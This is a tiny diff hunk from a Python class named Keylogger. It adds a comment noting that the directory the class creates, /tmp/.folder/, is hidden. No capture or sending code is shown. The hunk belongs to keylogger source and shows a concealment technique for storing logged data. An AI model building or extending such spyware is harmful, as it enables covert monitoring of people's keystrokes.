@@ -106,6 +106,7 @@ class Keylogger:
 	def make_get_dir(self):
 		# try making directory
 		try:
+			# folder is hidden!!! do ls -ltra
 			dir_to_create = '/tmp/.folder/'
 			os.mkdir(dir_to_create)
 		# if it already exists do nothing
